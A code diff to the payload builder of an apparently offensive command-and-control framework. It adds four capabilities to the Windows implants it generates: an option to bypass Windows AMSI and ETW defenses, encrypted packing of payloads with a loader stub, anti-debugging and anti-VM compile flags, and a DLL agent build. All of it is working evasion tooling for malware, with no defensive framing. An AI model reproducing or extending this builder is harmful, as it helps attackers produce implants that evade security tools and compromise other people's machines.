@@ -23,6 +23,10 @@ pub struct AgentConfig {
     pub use_sleep_obfuscation: u32,
     pub sleep_jitter_percent: f32,
     pub encrypt_memory_on_sleep: bool,
+    pub bypass_etw_amsi: bool,
+    pub enable_packing: bool,
+    pub packer_encryption: String,
+    pub packer_loader: String,
 }
 // -------------------------------------------------------
 
@@ -100,7 +104,7 @@ impl AgentHandler {
         config: &AgentConfig,
         database: &Arc<Database>,
     ) -> Result<Vec<u8>, String> {
-        match payload_type.to_lowercase().as_str() {
+        let payload = match payload_type.to_lowercase().as_str() {
             "exe" | "windows" => self.generate_windows_payload_with_config_exe(
                 agent_id,
                 listener_name,
@@ -120,7 +124,87 @@ impl AgentHandler {
                 database,
             ),
             _ => Err(format!("Unsupported payload type: {}", payload_type)),
+        }?;
+
+        if config.enable_packing && payload_type != "shellcode" {
+            return Self::pack_payload(agent_id, &payload, &config.packer_encryption, &config.packer_loader);
         }
+
+        Ok(payload)
+    }
+
+    fn pack_payload(
+        agent_id: &str,
+        payload: &[u8],
+        encryption: &str,
+        loader: &str,
+    ) -> Result<Vec<u8>, String> {
+        let cwd = env::current_dir()
+            .map_err(|e| format!("Cannot get current directory: {}", e))?;
+        let project_root = cwd
+            .parent()
+            .map(|p| p.to_path_buf())
+            .ok_or_else(|| format!("Cannot determine project root from cwd: {}", cwd.display()))?;
+
+        let packer_bin = project_root
+            .join("packer")
+            .join("target")
+            .join("release")
+            .join("packer");
+        let stub = project_root
+            .join("packer")
+            .join("target")
+            .join("x86_64-pc-windows-gnu")
+            .join("release")
+            .join("stub.exe");
+
+        if !packer_bin.exists() {
+            return Err(format!(
+                "Packer binary not found: {}. Run 'cargo build --release -p packer-cli' first.",
+                packer_bin.display()
+            ));
+        }
+        if !stub.exists() {
+            return Err(format!(
+                "Stub not found: {}. Run 'cargo build -p stub --release --target x86_64-pc-windows-gnu' first.",
+                stub.display()
+            ));
+        }
+
+        let tmp_input  = format!("/tmp/xorc2_pack_in_{}.bin", agent_id);
+        let tmp_output = format!("/tmp/xorc2_pack_out_{}.bin", agent_id);
+
+        fs::write(&tmp_input, payload)
+            .map_err(|e| format!("Failed to write temp input: {}", e))?;
+
+        let cmd = format!(
+            "{packer} --input {input} --output {output} --stub {stub} --encryption {enc} --loader {loader}",
+            packer = packer_bin.display(),
+            input  = tmp_input,
+            output = tmp_output,
+            stub   = stub.display(),
+            enc    = encryption,
+            loader = loader,
+        );
+
+        log::info!("[*] Packing payload (enc={}, loader={})...", encryption, loader);
+
+        let result = Self::run_cmd(&cmd)
+            .map_err(|e| format!("Packer failed: {}", e));
+
+        // Nettoyer le fichier d'entrée temp dans tous les cas
+        let _ = fs::remove_file(&tmp_input);
+
+        result?;
+
+        let packed = fs::read(&tmp_output)
+            .map_err(|e| format!("Failed to read packed output: {}", e))?;
+
+        let _ = fs::remove_file(&tmp_output);
+
+        log::info!("[+] Payload packed: {} bytes", packed.len());
+
+        Ok(packed)
     }
 
     fn generate_windows_payload_with_config_shellcode(
@@ -271,6 +355,7 @@ constexpr bool USE_HTTPS = {};
 constexpr int USE_SLEEP_OBFUSCATION = {};
 constexpr float SLEEP_JITTER_PERCENT = {};
 constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
+constexpr bool BYPASS_ETW_AMSI = {};
 "#,
             listener_name,
             listener.xor_key,
@@ -286,6 +371,7 @@ constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
             config.use_sleep_obfuscation,
             config.sleep_jitter_percent,
             config.encrypt_memory_on_sleep,
+            config.bypass_etw_amsi
         );
         let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
 
@@ -309,12 +395,19 @@ constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
 
         log::info!("[+] Configuration file written to: {}", config_path);
 
+        let mut flags = String::new();
+        if config.anti_debug      { flags.push_str(" -DANTI_DEBUG_ENABLED"); }
+        if config.anti_vm         { flags.push_str(" -DANTI_VM_ENABLED"); }
+        if config.bypass_etw_amsi { flags.push_str(" -DBYPASS_AMSI_ETW_ENABLED"); }
+
         let dll_path = format!("{}/agent.dll", agent_path_str);
 
         let cmd = format!(
             "x86_64-w64-mingw32-g++ \
+                {flags} \
+                -shared \
                 -o {dll} \
-                {p}/main_exe.cpp \
+                {p}/main_dll.cpp \
                 {p}/base64.cpp \
                 {p}/crypt.cpp \
                 {p}/system_utils.cpp \
@@ -327,18 +420,19 @@ constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
                 {p}/vm_detection.cpp \
                 {p}/sleep_obfuscation.cpp \
                 -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32",
+            flags = flags,
             dll = dll_path,
             p = agent_path_str
         );
 
-        log::info!("[*] Compiling Windows agent...");
+        log::info!("[*] Compiling Windows agent (DLL)...");
 
         Self::run_cmd(&cmd).map_err(|e| format!("Compilation failed: {}", e))?;
 
         log::info!("[+] Compilation successful: {}", dll_path);
 
         fs::read(&dll_path)
-            .map_err(|e| format!("Failed to read generated exe '{}': {}", dll_path, e))
+            .map_err(|e| format!("Failed to read generated dll '{}': {}", dll_path, e))
     }
 
     fn generate_windows_payload_with_config_exe(
@@ -433,6 +527,7 @@ constexpr bool USE_HTTPS = {};
 constexpr int USE_SLEEP_OBFUSCATION = {};
 constexpr float SLEEP_JITTER_PERCENT = {};
 constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
+constexpr bool BYPASS_ETW_AMSI = {};
 "#,
             listener_name,
             listener.xor_key,
@@ -448,6 +543,7 @@ constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
             config.use_sleep_obfuscation,
             config.sleep_jitter_percent,
             config.encrypt_memory_on_sleep,
+            if config.bypass_etw_amsi { "true" } else { "false" },
         );
 
         let cwd = env::current_dir().map_err(|e| format!("Cannot get current directory: {}", e))?;
@@ -472,10 +568,16 @@ constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
 
         log::info!("[+] Configuration file written to: {}", config_path);
 
+        let mut flags = String::new();
+        if config.anti_debug      { flags.push_str(" -DANTI_DEBUG_ENABLED"); }
+        if config.anti_vm         { flags.push_str(" -DANTI_VM_ENABLED"); }
+        if config.bypass_etw_amsi { flags.push_str(" -DBYPASS_AMSI_ETW_ENABLED"); }
+
         let exe_path = format!("{}/agent.exe", agent_path_str);
 
         let cmd = format!(
             "x86_64-w64-mingw32-g++ \
+                {flags} \
                 -o {exe} \
                 {p}/main_exe.cpp \
                 {p}/base64.cpp \
@@ -490,11 +592,12 @@ constexpr bool ENCRYPT_MEMORY_ON_SLEEP = {};
                 {p}/vm_detection.cpp \
                 {p}/sleep_obfuscation.cpp \
                 -lwininet -lpsapi -lshlwapi -lole32 -lshell32 -static-libstdc++ -static-libgcc -lws2_32",
+            flags = flags,
             exe = exe_path,
             p = agent_path_str
         );
 
-        log::info!("[*] Compiling Windows agent...");
+        log::info!("[*] Compiling Windows agent (EXE)...");
 
         Self::run_cmd(&cmd).map_err(|e| format!("Compilation failed: {}", e))?;
 
